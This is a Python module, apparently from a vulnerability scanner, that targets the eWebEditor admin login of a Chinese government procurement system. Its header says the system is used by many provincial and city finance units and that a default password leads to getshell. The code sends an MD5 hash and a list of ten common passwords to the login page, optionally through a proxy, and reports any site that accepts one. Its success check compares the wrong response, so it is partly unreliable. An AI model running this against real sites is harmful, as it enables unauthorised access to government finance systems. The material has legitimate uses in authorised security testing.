#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 政府采购系统eweb编辑器默认口令Getshell漏洞
referer: http://www.wooyun.org/bugs/wooyun-2016-0179879
author: Ascotbe
reference: Lucifer
description: 珠海政采软件技术有限公司的政府采购网系统 存在EWEB编辑器默认口令，直接getshell，多省市政府财政单位在用。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload="/ewebeditor/admin/login.jsp?action=login"
post_data = {
    "usr": "admin",
    "pwd": "81dc9bdb52d04dc20036dbd8313ed055"
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
            for payloads in ["admin", "123456", "password", "abc123", "1qaz2wsx", "123123", "12345", "aaaaaa", "12345678",
                           "000000"]:
                post_data2 = {
                    "usr": "admin",
                    "pwd": payloads
                }
                try:
                    resp2 = s.post(payload_url, headers=headers, data=post_data2, proxies=proxies, timeout=10, verify=False)
                    con2 = resp.text
                    code2 = resp2.status_code
                    if len(resp.text) != len(resp2.text):
                        if code2 == 200 and con2.lower().find('ewebeditor') != -1:
                            Medusa = "{} 存在政采eweb编辑器弱口令漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url, post_data)
                            return (Medusa)
                except:
                    pass
        elif ProxyIp==None:
            resp = s.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
            for payloads in ["admin", "123456", "password", "abc123", "1qaz2wsx", "123123", "12345", "aaaaaa", "12345678",
                           "000000"]:
                post_data2 = {
                    "usr": "admin",
                    "pwd": payloads
                }
                try:
                    resp2 = s.post(payload_url, headers=headers, data=post_data2, timeout=10, verify=False)
                    con2 = resp.text
                    code2 = resp2.status_code
                    if len(resp.text) != len(resp2.text):
                        if code2 == 200 and con2.lower().find('ewebeditor') != -1:
                            Medusa = "{} 存在政采eweb编辑器弱口令漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url, post_data)
                            return (Medusa)
                except:
                    pass
    except Exception as e:
        pass